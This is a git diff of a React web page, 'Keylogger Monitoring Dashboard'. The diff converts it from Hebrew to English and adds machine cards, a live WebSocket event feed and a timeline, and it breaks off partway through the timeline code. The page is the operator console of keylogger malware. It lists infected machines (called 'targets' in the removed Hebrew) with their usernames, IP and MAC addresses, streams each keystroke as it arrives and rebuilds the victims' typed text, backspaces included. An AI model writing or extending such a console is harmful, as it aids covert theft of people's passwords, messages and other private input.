@@ -1,9 +1,12 @@
 <!DOCTYPE html>
-<html lang="he" dir="rtl" data-bs-theme="dark">
+<html lang="en" dir="ltr" data-bs-theme="dark">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Keylogger Monitoring Dashboard</title>
+  
+  <!-- Favicon -->
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
   
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
   
@@ -14,15 +17,17 @@
   
   <script src="https://unpkg.com/babel-standalone@6.26.0/babel.min.js"></script>
   
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700&display=swap');
     
     :root {
-      --bs-body-font-family: 'Rubik', sans-serif;
+      --bs-body-font-family: 'Inter', sans-serif;
       --bs-body-bg: #1a1a1a;
       --bs-tertiary-bg: #242424;
       --bs-border-color: #3a3a3a;
-      --cyber-green: #00ff88; /* צבע ירוק סייברי */
+      --cyber-green: #00ff88; /* Cyber green color */
     }
 
     body {
@@ -38,8 +43,8 @@
       background-color: var(--bs-tertiary-bg);
       border: 1px solid var(--bs-border-color);
       transition: background-color 0.2s ease-in-out;
-      height: 100%; /* גובה אחיד */
-      min-height: 120px; /* גובה מינימלי */
+      height: 100%; /* Uniform height */
+      min-height: 120px; /* Minimum height */
       display: flex;
       align-items: center;
       justify-content: center;
@@ -50,7 +55,7 @@
     }
     .kpi-card .kpi-icon {
       font-size: 2rem;
-      color: var(--cyber-green); /* ירוק סייברי */
+      color: var(--cyber-green); /* Cyber green */
       margin-bottom: 0.5rem;
     }
     .kpi-card .kpi-content {
@@ -117,6 +122,121 @@
     .badge {
         font-weight: 500;
     }
+
+    /* CSS for machine cards */
+    .machine-card {
+      transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+    }
+    
+    .machine-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 255, 136, 0.2);
+    }
+    
+    .status-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      display: inline-block;
+    }
+    
+    .status-dot.active {
+      background-color: var(--cyber-green);
+      box-shadow: 0 0 6px var(--cyber-green);
+    }
+    
+    .status-dot.inactive {
+      background-color: #dc3545;
+      box-shadow: 0 0 6px rgba(220, 53, 69, 0.5);
+    }
+
+    /* CSS for Timeline */
+    .timeline-container {
+      display: flex;
+      height: 500px;
+      background-color: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    
+    .timeline-sidebar {
+      width: 120px;
+      background-color: #222;
+      border-left: 3px solid var(--cyber-green);
+      position: relative;
+      flex-shrink: 0;
+    }
+    
+    .timeline-content-area {
+      flex: 1;
+      overflow-y: auto;
+      padding: 20px;
+      font-family: 'Courier New', monospace;
+      white-space: pre-wrap;
+      color: #fff;
+      line-height: 1.6;
+      direction: ltr;
+      text-align: left;
+      background-color: #1a1a1a;
+    }
+    
+    .time-marker {
+      position: absolute;
+      left: 5px;
+      right: 5px;
+      font-size: 0.75rem;
+      color: var(--cyber-green);
+      background-color: rgba(26, 26, 26, 0.9);
+      padding: 2px 4px;
+      border-radius: 4px;
+      text-align: center;
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      z-index: 10;
+    }
+    
+    .time-marker::before {
+      content: '';
+      position: absolute;
+      left: -15px;
+      top: 50%;
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background-color: var(--cyber-green);
+      transform: translateY(-50%);
+      box-shadow: 0 0 4px rgba(0, 255, 136, 0.7);
+      z-index: 5;
+    }
+
+    /* Scrollbar styling for timeline */
+    .timeline-container::-webkit-scrollbar {
+      width: 8px;
+    }
+    
+    .timeline-container::-webkit-scrollbar-track {
+      background: #1a1a1a;
+      border-radius: 4px;
+    }
+    
+    .timeline-container::-webkit-scrollbar-thumb {
+      background: var(--cyber-green);
+      border-radius: 4px;
+    }
+    
+    .timeline-container::-webkit-scrollbar-thumb:hover {
+      background: #00cc6a;
+    }
+
+    /* Animation for refresh button */
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    
+    .animate-spin {
+      animation: spin 1s linear infinite;
+    }
   </style>
 </head>
 <body>
@@ -125,346 +245,709 @@
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 
   <script type="text/babel">
-    const { useState, useEffect, useMemo } = React;
+    const { useState, useEffect, useMemo, useRef } = React;
 
     const API_BASE = "[[ base_url ]]";
 
-    // פונקציות API
-    const fetchAllLogs = async (offset = 0, limit = 40) => {
-        const response = await fetch(`${API_BASE}/logs?offset=${offset}&limit=${limit}`);
+    // New API functions
+    const API = {
+      fetchMachines: async (filters = {}) => {
+        const params = new URLSearchParams();
+        if (filters.username) params.append('username', filters.username);
+        if (filters.title) params.append('title', filters.title);
+        if (filters.status !== '' && filters.status !== undefined) params.append('status', filters.status);
+        if (filters.offset) params.append('offset', filters.offset);
+        if (filters.limit) params.append('limit', filters.limit);
+        
+        const response = await fetch(`${API_BASE}/api/machines/?${params}`);
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
         return response.json();
-    };
-    const fetchAllUsers = async () => {
-        const response = await fetch(`${API_BASE}/logs/user`);
+      },
+      
+      fetchMachineById: async (machineId) => {
+        const response = await fetch(`${API_BASE}/api/machines/${machineId}`);
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
         return response.json();
-    };
-    const fetchAllMachines = async () => {
-        const response = await fetch(`${API_BASE}/logs/machine`);
-        return response.json();
-    };
-    const fetchLogsByUser = async (username, offset = 0, limit = 40) => {
-        const response = await fetch(`${API_BASE}/logs/user/${username}?offset=${offset}&limit=${limit}`);
-        return response.json();
-    };
-    const fetchLogsByMachine = async (machine, offset = 0, limit = 40) => {
-        const response = await fetch(`${API_BASE}/logs/machine/${machine}?offset=${offset}&limit=${limit}`);
-        return response.json();
-    };
-    const fetchLogsByDate = async (start, end, offset = 0, limit = 40) => {
-        const response = await fetch(`${API_BASE}/logs/date?start=${start}&end=${end}&offset=${offset}&limit=${limit}`);
-        return response.json();
-    };
-    const fetchLogsFiltered = async (filters = {}, offset = 0, limit = 40) => {
+      },
+      
+      fetchMachineEvents: async (machineId, offset = 0, limit = 50) => {
         const params = new URLSearchParams();
         params.append('offset', offset);
         params.append('limit', limit);
         
-        if (filters.username) params.append('username', filters.username);
-        if (filters.machine) params.append('machine', filters.machine);
-        if (filters.start_date) params.append('start_date', filters.start_date);
-        if (filters.end_date) params.append('end_date', filters.end_date);
-        if (filters.q) params.append('q', filters.q);
-        
-        const response = await fetch(`${API_BASE}/logs?${params}`);
+        const response = await fetch(`${API_BASE}/api/events/${machineId}?${params}`);
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
         return response.json();
+      },
+      
+      fetchEventsCount: async (machineId) => {
+        const response = await fetch(`${API_BASE}/api/events/${machineId}/count`);
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+        return response.json();
+      },
+      
+      updateMachineTitle: async (username, title) => {
+        const response = await fetch(`${API_BASE}/api/machines/${username}/title`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ title })
+        });
+        return response.json();
+      }
     };
 
-    // קומפוננטה ראשית
-    function KeyloggerDashboard() {
-        const [logs, setLogs] = useState([]);
-        const [users, setUsers] = useState([]);
-        const [machines, setMachines] = useState([]);
-        const [loading, setLoading] = useState(true);
-        const [selectedUser, setSelectedUser] = useState('');
-        const [selectedMachine, setSelectedMachine] = useState('');
-        const [startDate, setStartDate] = useState('');
-        const [endDate, setEndDate] = useState('');
-        const [searchText, setSearchText] = useState('');
-        const [currentPage, setCurrentPage] = useState(0);
-        const [selectedLog, setSelectedLog] = useState(null);
-        
-        // KPIs
-        const [totalLogsCount, setTotalLogsCount] = useState(0);
-        const [mostActiveUser, setMostActiveUser] = useState({ name: '-', count: 0 });
-        const [lastActivity, setLastActivity] = useState('-');
+    // Machine Card Component
+    function MachineCard({ machine, onClick }) {
+      const getOSIcon = (system) => {
+        if (!system) return <i className="bi bi-question-circle" title="Unknown OS"></i>;
+        const lowerSystem = system.toLowerCase();
+        if (lowerSystem.includes('windows')) return <i className="bi bi-windows" title={system}></i>;
+        if (lowerSystem.includes('mac') || lowerSystem.includes('apple')) return <i className="bi bi-apple" title={system}></i>;
+        if (lowerSystem.includes('linux')) return <i className="bi bi-ubuntu" title={system}></i>;
+        return <i className="bi bi-pc-display-horizontal" title={system}></i>;
+      };
 
-        const ITEMS_PER_PAGE = 25;
+      const formatDate = (timestamp) => {
+        return new Date(timestamp * 1000).toLocaleString('en-US', { 
+          dateStyle: 'short', 
+          timeStyle: 'short' 
+        });
+      };
 
-       
-        const hasActiveFilters = () => {
-            return selectedUser || selectedMachine || startDate || endDate || searchText;
-        };
-
-        
-        const loadData = async (page = 0) => {
-            try {
-                if (page === 0 && logs.length === 0) setLoading(true);
-
-                let logsResponse;
-                
-                if (hasActiveFilters()) {
-                    const filters = {};
-                    if (selectedUser) filters.username = selectedUser;
-                    if (selectedMachine) filters.machine = selectedMachine;
-                    if (startDate) filters.start_date = startDate;
-                    if (endDate) filters.end_date = endDate; 
-                    if (searchText) filters.q = searchText;
-                    
-                    logsResponse = await fetchLogsFiltered(filters, page * ITEMS_PER_PAGE, ITEMS_PER_PAGE);
-                } else {
-                    logsResponse = await fetchAllLogs(page * ITEMS_PER_PAGE, ITEMS_PER_PAGE);
-                }
-
-                const [usersData, machinesData] = await Promise.all([
-                    fetchAllUsers(),
-                    fetchAllMachines()
-                ]);
-
-                const logsData = logsResponse.logs || [];
-                setLogs(logsData);
-                setTotalLogsCount(logsResponse.total || logsData.length);
-                setUsers(usersData.usernames || []);
-                setMachines(machinesData.machines || []);
-                
-                // Calculate KPIs
-                if (logsData.length > 0) {
-                    const userCounts = logsData.reduce((acc, log) => {
-                        acc[log.username] = (acc[log.username] || 0) + 1;
-                        return acc;
-                    }, {});
-
-                    if (Object.keys(userCounts).length > 0) {
-                        const mostActive = Object.entries(userCounts).reduce((a, b) => a[1] > b[1] ? a : b);
-                        setMostActiveUser({ name: mostActive[0], count: mostActive[1] });
-                    }
-                    
-                    const latestLog = logsData[0];
-                    const timeDiff = Date.now() - new Date(latestLog.timestamp).getTime();
-                    const minutesAgo = Math.floor(timeDiff / 60000);
-
-                    if (minutesAgo < 1) {
-                        setLastActivity('כרגע');
-                    } else if (minutesAgo < 60) {
-                        setLastActivity(`לפני ${minutesAgo} דקות`);
-                    } else if (minutesAgo < 1440) {
-                        const hoursAgo = Math.floor(minutesAgo / 60);
-                        setLastActivity(`לפני ${hoursAgo} שעות`);
-                    } else {
-                        const daysAgo = Math.floor(minutesAgo / 1440);
-                        setLastActivity(`לפני ${daysAgo} ימים`);
-                    }
-                }
-
-            } catch (error) {
-                console.error('Error fetching data:', error);
-            } finally {
-                setLoading(false);
-            }
-        };
-
-        useEffect(() => {
-            loadData();
-            const interval = setInterval(() => loadData(currentPage), 30000);
-            return () => clearInterval(interval);
-        }, [currentPage, selectedUser, selectedMachine, startDate, endDate, searchText]); 
-
-        const handleFilter = async () => {
-            setLoading(true);
-            setCurrentPage(0);
-            
-            await loadData(0);
-        };
-
-        const resetFilters = () => {
-            setSelectedUser('');
-            setSelectedMachine('');
-            setStartDate('');
-            setEndDate('');
-            setSearchText('');
-            setCurrentPage(0);
-            loadData();
-        };
-
-        const getOSIcon = (machine) => {
-            if (!machine) return <i className="bi bi-question-circle os-icon" title="Unknown OS"></i>;
-            const lowerMachine = machine.toLowerCase();
-            if (lowerMachine.includes('windows')) return <i className="bi bi-windows os-icon" title={machine}></i>;
-            if (lowerMachine.includes('mac') || lowerMachine.includes('apple')) return <i className="bi bi-apple os-icon" title={machine}></i>;
-            if (lowerMachine.includes('linux')) return <i className="bi bi-ubuntu os-icon" title={machine}></i>;
-            return <i className="bi bi-pc-display-horizontal os-icon" title={machine}></i>;
-        };
-
-        const formatDate = (timestamp) => {
-            return new Date(timestamp).toLocaleString('he-IL', { dateStyle: 'short', timeStyle: 'short' });
-        };
-
-        return (
-            <div className="container-fluid p-4">
-                {/* Header */}
-                <header className="dashboard-header d-flex justify-content-between align-items-center mb-4">
-                    <div>
-                        <h1 className="h3 mb-0">Keylogger Dashboard</h1>
-                        <p className="text-body-secondary mb-0">ניטור וניתוח הקלדות סוכנים</p>
-                    </div>
-                    <div>
-                        <span className="badge text-bg-success">● Live</span>
-                    </div>
-                </header>
-
-                {/* KPI Cards */}
-                <div className="row g-3 mb-4">
-                    <div className="col">
-                        <div className="card kpi-card p-3">
-                            <div className="kpi-content">
-                                <div className="kpi-icon"><i className="bi bi-journal-text"></i></div>
-                                <div className="kpi-label">סה"כ לוגים</div>
-                                <div className="kpi-value">{loading && totalLogsCount === 0 ? '...' : totalLogsCount.toLocaleString()}</div>
-                            </div>
-                        </div>
-                    </div>
-                    <div className="col">
-                         <div className="card kpi-card p-3">
-                            <div className="kpi-content">
-                                <div className="kpi-icon"><i className="bi bi-people-fill"></i></div>
-                                <div className="kpi-label">סה"כ יעדים</div>
-                                <div className="kpi-value">{loading && users.length === 0 ? '...' : users.length}</div>
-                            </div>
-                        </div>
-                    </div>
-                    <div className="col">
-                        <div className="card kpi-card p-3">
-                            <div className="kpi-content">
-                                <div className="kpi-icon"><i className="bi bi-person-check-fill"></i></div>
-                                <div className="kpi-label">היעד הפעיל ביותר</div>
-                                <div className="kpi-value">{loading && mostActiveUser.name === '-' ? '...' : mostActiveUser.name}</div>
-                            </div>
-                        </div>
-                    </div>
-                    <div className="col">
-                         <div className="card kpi-card p-3">
-                            <div className="kpi-content">
-                                <div className="kpi-icon"><i className="bi bi-clock-history"></i></div>
-                                <div className="kpi-label">פעילות אחרונה</div>
-                                <div className="kpi-value">{loading && lastActivity === '-' ? '...' : lastActivity}</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                {/* Filtering & Table Card */}
-                <div className="card">
-                    <div className="card-header">
-                        <div className="row g-2 align-items-center">
-                            <div className="col-md-2">
-                                <select className="form-select form-select-sm" value={selectedUser} onChange={(e) => setSelectedUser(e.target.value)}>
-                                    <option value="">סינון לפי יעד</option>
-                                    {users.map(user => <option key={user} value={user}>{user}</option>)}
-                                </select>
-                            </div>
-                            <div className="col-md-3">
-                                <select className="form-select form-select-sm" value={selectedMachine} onChange={(e) => setSelectedMachine(e.target.value)}>
-                                    <option value="">סינון לפי מערכת הפעלה</option>
-                                    {machines.map(machine => <option key={machine} value={machine}>{machine}</option>)}
-                                </select>
-                            </div>
-                            <div className="col-md-2">
-                                <input type="datetime-local" className="form-control form-control-sm" value={startDate} onChange={(e) => setStartDate(e.target.value)} />
-                            </div>
-                            <div className="col-md-2">
-                                <input type="datetime-local" className="form-control form-control-sm" value={endDate} onChange={(e) => setEndDate(e.target.value)} />
-                            </div>
-                            <div className="col-md-3">
-                                <input type="search" className="form-control form-control-sm" placeholder="חיפוש טקסט בתוכן..." value={searchText} onChange={(e) => setSearchText(e.target.value)} />
-                            </div>
-                        </div>
-                         <div className="row mt-2">
-                            <div className="col-12">
-                                <button className="btn text-bg-success btn-sm me-2" onClick={handleFilter}><i className="bi bi-search me-1"></i> החל סינונים</button>
-                                <button className="btn btn-outline-secondary btn-sm" onClick={resetFilters}><i className="bi bi-arrow-clockwise me-1"></i> אפס</button>
-                            </div>
-                        </div>
-                    </div>
-                    <div className="card-body p-0">
-                        {/* FIX 2 HERE: Added the wrapper div */}
-                        <div className="table-wrapper">
-                            <div className="table-responsive">
-                                <table className="table table-hover logs-table mb-0">
-                                    <thead>
-                                        <tr>
-                                            <th>זמן</th>
-                                            <th>שם היעד</th>
-                                            <th>מערכת הפעלה</th>
-                                            <th>תוכן ההקלדה</th>
-                                            <th className="text-end">פרטים נוספים</th>
-                                        </tr>
-                                    </thead>
-                                    <tbody>
-                                        {loading && logs.length === 0 ? (
-                                            <tr><td colSpan="5" className="text-center p-5"><div className="spinner-border" role="status"><span className="visually-hidden">טוען...</span></div></td></tr>
-                                        ) : logs.map(log => (
-                                            <tr key={log.id}>
-                                                <td className="text-nowrap text-body-secondary">{formatDate(log.timestamp)}</td>
-                                                <td><span className="badge text-bg-info text-dark">{log.username}</span></td>
-                                                <td>{getOSIcon(log.machine)} <small>{log.machine}</small></td>
-                                                <td><div className="truncate font-monospace">{log.keylog}</div></td>
-                                                <td className="text-end">
-                                                    <button className="btn btn-sm btn-outline-light" onClick={() => setSelectedLog(log)}>
-                                                        <i className="bi bi-eye"></i>
-                                                    </button>
-                                                </td>
-                                            </tr>
-                                        ))}
-                                    </tbody>
-                                </table>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                
-                {/* Pagination */}
-
-                {/* Log Details Modal */}
-                {selectedLog && (
-                    <div className="modal fade show d-block" tabIndex="-1" style={{ backgroundColor: 'rgba(0,0,0,0.5)' }}>
-                        <div className="modal-dialog modal-lg modal-dialog-centered">
-                            <div className="modal-content">
-                                <div className="modal-header">
-                                    <h5 className="modal-title">פרטי לוג - {formatDate(selectedLog.timestamp)}</h5>
-                                    <button type="button" className="btn-close" onClick={() => setSelectedLog(null)}></button>
-                                </div>
-                                <div className="modal-body">
-                                    <div className="mb-3">
-                                        <strong>משתמש:</strong> <span className="badge text-bg-info text-dark ms-2">{selectedLog.username}</span>
-                                    </div>
-                                    <div className="mb-3">
-                                        <strong>מערכת הפעלה:</strong> <span className="ms-2">{getOSIcon(selectedLog.machine)} {selectedLog.machine}</span>
-                                    </div>
-                                    <div className="mb-3">
-                                        <strong>תוכן מלא:</strong>
-                                        <textarea 
-                                            className="form-control mt-2 font-monospace" 
-                                            rows="12" 
-                                            readOnly 
-                                            value={selectedLog.keylog}
-                                            style={{ direction: 'ltr', textAlign: 'left' }}
-                                        ></textarea>
-                                    </div>
-                                </div>
-                                <div className="modal-footer">
-                                    <button type="button" className="btn btn-secondary" onClick={() => setSelectedLog(null)}>סגור</button>
-                                    <button type="button" className="btn btn-primary" onClick={() => navigator.clipboard.writeText(selectedLog.keylog)}>
-                                       <i className="bi bi-clipboard me-1"></i> העתק תוכן
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                )}
+      return (
+        <div 
+          className="card machine-card h-100" 
+          onClick={() => onClick(machine.id)} 
+          style={{ cursor: 'pointer' }}
+          title={`Click to view machine details ${machine.display_username}`}
+        >
+          <div className="card-header d-flex justify-content-between align-items-center">
+            <div className="d-flex align-items-center">
+              <span className={`status-dot me-2 ${machine.active ? 'active' : 'inactive'}`}></span>
+              <span className="fw-bold">{machine.display_username}</span>
             </div>
-        );
+            {getOSIcon(machine.system)}
+          </div>
+          <div className="card-body">
+            <div className="mb-2">
+              <small className="text-muted">User:</small>
+              <div className="fw-medium">{machine.machine_username || 'N/A'}</div>
+            </div>
+            <div className="mb-2">
+              <small className="text-muted">IP Address:</small>
+              <div className="font-monospace small">{machine.ip_address}</div>
+            </div>
+            <div className="mb-2">
+              <small className="text-muted">MAC Address:</small>
+              <div className="font-monospace small">{machine.mac_address}</div>
+            </div>
+            <div className="mb-2">
+              <small className="text-muted">Operating System:</small>
+              <div className="small">{machine.system} {machine.release}</div>
+            </div>
+            {machine.title && (
+              <div className="mb-2">
+                <small className="text-muted">Title:</small>
+                <div className="small">{machine.title}</div>
+              </div>
+            )}
+            <div>
+              <small className="text-muted">First Connection:</small>
+              <div className="small">{formatDate(machine.first_login)}</div>
+            </div>
+          </div>
+        </div>
+      );
     }
 
-    ReactDOM.createRoot(document.getElementById("root")).render(<KeyloggerDashboard />);
+    // Machines List Component
+    function MachinesListView({ onMachineSelect }) {
+      const [machines, setMachines] = useState([]);
+      const [loading, setLoading] = useState(true);
+      const [error, setError] = useState(null);
+      const [filters, setFilters] = useState({
+        username: '',
+        title: '',
+        status: '',
+        offset: 0,
+        limit: 20
+      });
+
+      const loadMachines = async () => {
+        try {
+          setLoading(true);
+          setError(null);
+          const data = await API.fetchMachines(filters);
+          setMachines(data);
+        } catch (error) {
+          console.error('Error loading machines:', error);
+          setError('Error loading machines. Please try again.');
+        } finally {
+          setLoading(false);
+        }
+      };
+
+      useEffect(() => {
+        loadMachines();
+        
+        // Auto-refresh every 30 seconds
+        const interval = setInterval(loadMachines, 30000);
+        return () => clearInterval(interval);
+      }, []);
+
+      const applyFilters = () => {
+        loadMachines();
+      };
+
+      const resetFilters = () => {
+        setFilters({
+          username: '',
+          title: '',
+          status: '',
+          offset: 0,
+          limit: 20
+        });
+        setTimeout(loadMachines, 100);
+      };
+
+      const activeMachines = machines.filter(m => m.active).length;
+      const totalMachines = machines.length;
+
+      return (
+        <div>
+          {/* Statistics */}
+          <div className="row g-3 mb-4">
+            <div className="col-md-3">
+              <div className="card kpi-card p-3">
+                <div className="kpi-content">
+                  <div className="kpi-icon"><i className="bi bi-pc-display"></i></div>
+                  <div className="kpi-label">Total Machines</div>
+                  <div className="kpi-value">{loading ? '...' : totalMachines}</div>
+                </div>
+              </div>
+            </div>
+            <div className="col-md-3">
+              <div className="card kpi-card p-3">
+                <div className="kpi-content">
+                  <div className="kpi-icon"><i className="bi bi-wifi"></i></div>
+                  <div className="kpi-label">Active Machines</div>
+                  <div className="kpi-value">{loading ? '...' : activeMachines}</div>
+                </div>
+              </div>
+            </div>
+            <div className="col-md-3">
+              <div className="card kpi-card p-3">
+                <div className="kpi-content">
+                  <div className="kpi-icon"><i className="bi bi-wifi-off"></i></div>
+                  <div className="kpi-label">Inactive Machines</div>
+                  <div className="kpi-value">{loading ? '...' : (totalMachines - activeMachines)}</div>
+                </div>
+              </div>
+            </div>
+            <div className="col-md-3">
+              <div className="card kpi-card p-3">
+                <div className="kpi-content">
+                  <div className="kpi-icon"><i className="bi bi-percent"></i></div>
+                  <div className="kpi-label">Activity Rate</div>
+                  <div className="kpi-value">{loading ? '...' : totalMachines > 0 ? Math.round((activeMachines / totalMachines) * 100) + '%' : '0%'}</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Filters */}
+          <div className="card mb-4">
+            <div className="card-header">
+              <h5 className="mb-0">Filter Machines</h5>
+            </div>
+            <div className="card-body">
+              <div className="row g-2 mb-3">
+                <div className="col-md-3">
+                  <input 
+                    className="form-control" 
+                    placeholder="Search by username"
+                    value={filters.username}
+                    onChange={(e) => setFilters({...filters, username: e.target.value})}
+                  />
+                </div>
+                <div className="col-md-3">
+                  <input 
+                    className="form-control" 
+                    placeholder="Search by title"
+                    value={filters.title}
+                    onChange={(e) => setFilters({...filters, title: e.target.value})}
+                  />
+                </div>
+                <div className="col-md-2">
+                  <select 
+                    className="form-select" 
+                    value={filters.status}
+                    onChange={(e) => setFilters({...filters, status: e.target.value})}
+                  >
+                    <option value="">All Statuses</option>
+                    <option value="true">Active</option>
+                    <option value="false">Inactive</option>
+                  </select>
+                </div>
+                <div className="col-md-2">
+                  <button className="btn btn-primary w-100" onClick={applyFilters}>
+                    <i className="bi bi-search me-1"></i>Search
+                  </button>
+                </div>
+                <div className="col-md-2">
+                  <button className="btn btn-outline-secondary w-100" onClick={resetFilters}>
+                    <i className="bi bi-arrow-clockwise me-1"></i>Clear
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Machines List */}
+          <div className="card">
+            <div className="card-header d-flex justify-content-between align-items-center">
+              <h5 className="mb-0">Machines ({machines.length})</h5>
+              <button 
+                className="btn btn-sm btn-outline-primary" 
+                onClick={loadMachines}
+                disabled={loading}
+              >
+                <i className={`bi ${loading ? 'bi-arrow-repeat animate-spin' : 'bi-arrow-clockwise'} me-1`}></i>
+                Refresh
+              </button>
+            </div>
+            <div className="card-body">
+              {error && (
+                <div className="alert alert-danger" role="alert">
+                  <i className="bi bi-exclamation-triangle me-2"></i>
+                  {error}
+                  <button className="btn btn-sm btn-outline-danger ms-2" onClick={loadMachines}>
+                    Try Again
+                  </button>
+                </div>
+              )}
+              {loading ? (
+                <div className="text-center p-5">
+                  <div className="spinner-border" role="status">
+                    <span className="visually-hidden">Loading...</span>
+                  </div>
+                </div>
+              ) : machines.length === 0 ? (
+                <div className="text-center p-5 text-muted">
+                  <i className="bi bi-pc-display display-1"></i>
+                  <h5 className="mt-3">No machines found</h5>
+                  <p>Try changing the filters or wait for new machines to connect</p>
+                </div>
+              ) : (
+                <div className="row g-3">
+                  {machines.map(machine => (
+                    <div key={machine.id} className="col-md-6 col-lg-4 col-xl-3">
+                      <MachineCard machine={machine} onClick={onMachineSelect} />
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      );
+    }
+
+    // Machine Details Component
+    function MachineDetailView({ machineId, onBack }) {
+      const [machine, setMachine] = useState(null);
+      const [events, setEvents] = useState([]);
+      const [loading, setLoading] = useState(true);
+      const [eventsLoading, setEventsLoading] = useState(true);
+      const [autoScroll, setAutoScroll] = useState(true);
+      const [eventsCount, setEventsCount] = useState(0);
+      const [socketConnected, setSocketConnected] = useState(false);
+      const timelineRef = useRef(null);
+
+      const loadMachineData = async () => {
+        try {
+          setLoading(true);
+          const machineData = await API.fetchMachineById(machineId);
+          setMachine(machineData);
+        } catch (error) {
+          console.error('Error loading machine:', error);
+        } finally {
+          setLoading(false);
+        }
+      };
+
+      const loadEvents = async () => {
+        try {
+          setEventsLoading(true);
+          const [eventsData, countData] = await Promise.all([
+            API.fetchMachineEvents(machineId, 0, 10000),
+            API.fetchEventsCount(machineId)
+          ]);
+          setEvents(eventsData.reverse()); 
+          setEventsCount(countData.count);
+        } catch (error) {
+          console.error('Error loading events:', error);
+        } finally {
+          setEventsLoading(false);
+        }
+      };
+
+      const scrollToBottom = () => {
+        const contentArea = timelineRef.current && timelineRef.current.querySelector('.timeline-content-area');
+        if (contentArea) {
+          contentArea.scrollTop = contentArea.scrollHeight;
+        }
+      };
+
+      const toggleAutoScroll = () => {
+        setAutoScroll(!autoScroll);
+        if (!autoScroll) {
+          setTimeout(scrollToBottom, 100);
+        }
+      };
+
+      useEffect(() => {
+        loadMachineData();
+        loadEvents();
+        
+        // WebSocket connection for real-time updates
+        const socket = io(API_BASE);
+        
+        socket.on('connect', () => {
+          console.log('Connected to WebSocket');
+          setSocketConnected(true);
+        });
+        
+        socket.on('disconnect', () => {
+          console.log('Disconnected from WebSocket');
+          setSocketConnected(false);
+        });
+        
+        socket.on('new_event', (eventData) => {
+          if (eventData.machine_id === parseInt(machineId)) {
+            setEvents(prev => [...prev, eventData]);
+            setEventsCount(prev => prev + 1);
+            if (autoScroll) {
+              setTimeout(scrollToBottom, 100);
+            }
+          }
+        });
+        
+        socket.on('machine_status_changed', (statusData) => {
+          if (statusData.machine_id === parseInt(machineId)) {
+            setMachine(prev => ({ ...prev, active: statusData.active }));
+          }
+        });
+        
+        return () => {
+          socket.disconnect();
+        };
+      }, [machineId]);
+
+      useEffect(() => {
+        if (autoScroll && events.length > 0) {
+          setTimeout(scrollToBottom, 100);
+        }
+      }, [events, autoScroll]);
+
+      const formatDate = (timestamp) => {
+        return new Date(timestamp * 1000).toLocaleString('en-US', { 
+          dateStyle: 'full', 
+          timeStyle: 'medium' 
+        });
+      };
+
+      const formatTime = (timestamp) => {
+        return new Date(timestamp * 1000).toLocaleString('en-US', { 
+          timeStyle: 'medium' 
+        });
+      };
+
+      const getOSIcon = (system) => {
+        if (!system) return <i className="bi bi-question-circle" title="Unknown OS"></i>;
+        const lowerSystem = system.toLowerCase();
+        if (lowerSystem.includes('windows')) return <i className="bi bi-windows" title={system}></i>;
+        if (lowerSystem.includes('mac') || lowerSystem.includes('apple')) return <i className="bi bi-apple" title={system}></i>;
+        if (lowerSystem.includes('linux')) return <i className="bi bi-ubuntu" title={system}></i>;
+        return <i className="bi bi-pc-display-horizontal" title={system}></i>;
+      };
+
+      // Function to convert events to continuous text
+      const convertEventsToText = (eventsList) => {
+        let fullText = '';
+        
+        // The array comes from newest to oldest, so we iterate from start to end to get correct chronological order
+        for (let i = 0; i < eventsList.length; i++) {
+          const event = eventsList[i];
+          const eventText = event.event;
+          
+          if (eventText === '\n' || eventText === 'Key.enter') {
+            fullText += '\n';
+          } else if (eventText === '\b' || eventText === 'Key.backspace') {
+            // Deletion - remove one character
+            fullText = fullText.slice(0, -1);
+          } else if (eventText === '\t' || eventText === 'Key.tab') {
+            fullText += '    '; // Tab = 4 spaces
+          } else if (eventText === 'Key.space') {
+            fullText += ' ';
+          } else if (eventText.length === 1 && !eventText.match(/[\u0000-\u001F]/) || 
+                     (eventText.match(/[\u0000-\u001F]/) && eventText !== '\u0003' && eventText !== '\u0001')) {
+            // Regular character or allowed control character
+            fullText += eventText;
+          }
+          // Skip other special keys
+        }
+        
+        return fullText;
+      };
+
+      const processedText = convertEventsToText(events);
+      
+      // Creating real time points for timeline - only minutes
+      const createTimePoints = () => {
+        if (events.length === 0) return [];
+        
+        const firstTime = events[events.length - 1].timestamp; // Oldest
+        const lastTime = events[0].timestamp; // Newest
+        const timeDiff = lastTime - firstTime;
+        
+        // Take only events with at least a minute difference
+        const timePoints = [];
+        const seenMinutes = new Set();
+        
+        for (let i = 0; i < events.length; i++) {
+          const event = events[i];
+          const eventDate = new Date(event.timestamp * 1000);
+          const minuteKey = `${eventDate.getHours()}:${eventDate.getMinutes().toString().padStart(2, '0')}`;
+          
+          if (!seenMinutes.has(minuteKey)) {
+            seenMinutes.add(minuteKey);
+            const relativeTime = (event.timestamp - firstTime) / timeDiff;
